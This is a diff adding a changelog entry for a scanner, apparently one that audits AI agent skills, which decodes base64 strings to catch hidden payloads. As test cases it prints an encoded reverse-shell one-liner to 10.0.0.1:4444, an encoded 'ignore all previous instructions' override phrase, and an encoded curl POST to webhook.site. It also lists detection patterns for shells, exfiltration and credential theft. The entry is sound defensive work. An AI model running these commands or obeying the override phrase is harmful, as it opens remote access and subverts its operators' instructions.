@@ -1,5 +1,19 @@
 # SHIPLOG — SkillAudit Shipping Log
 
+## 2026-02-22 (7:00 PM) — Base64 Payload Decoder (See Through Obfuscation)
+**What:** The scanner now automatically finds base64-encoded strings, decodes them, and scans the decoded content for malicious patterns. Every scan sees through obfuscation — no configuration needed.
+**How it works:**
+- Regex finds base64 strings (40+ chars) in quotes or after assignments
+- Decodes each one and checks printability (>70% printable = text payload, not binary)
+- Scans decoded content against 12 threat categories: hidden URLs, network calls (curl/fetch/wget), code execution (eval/exec/spawn), credential references, shell interpreters (/bin/bash, cmd.exe), destructive commands (rm -rf), exfiltration domains (webhook.site, ngrok), prompt injection, SQL statements, script tags, network tools (ssh/nc), and private keys
+- Skips placeholder lines (YOUR_KEY, etc.) but intentionally does NOT skip doc context — attackers deliberately hide payloads in config/documentation sections
+**What it catches (tested):**
+- `L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xLzQ0NDQgMD4mMQ==` → detects as "Hidden shell reference" (critical) — that's `/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
+- `aWdub3JlIGFsbCBwcmV2aW91cyBpbnN0cnVjdGlvbnM...` → detects as "Hidden prompt injection" (critical)
+- `Y3VybCAtWCBQT1NUIGh0dHBzOi8vd2ViaG9vay5zaXRl...` → detects as "Hidden URL" + "Hidden network call" + "Hidden exfiltration domain"
+- Normal base64 like JWT tokens in setup guides → NOT flagged (no false positives)
+**Why:** This is the most important scanner improvement since launch. Before this, an attacker could base64-encode ANY malicious payload and bypass every single detection rule. `Buffer.from("payload", "base64")` was the universal bypass. Now it's not. Every existing scan — gate, bulk, CLI, manifest, everything — automatically sees through base64 obfuscation. This closes the #1 evasion technique for agent security scanners.
+
 ## 2026-02-22 (4:00 PM) — Webhook Event Subscriptions (Push-Based Security Events)
 **What:** Full webhook subscription system — register a URL with filters, receive real-time POST notifications when scans match your criteria.
 **Endpoints:**
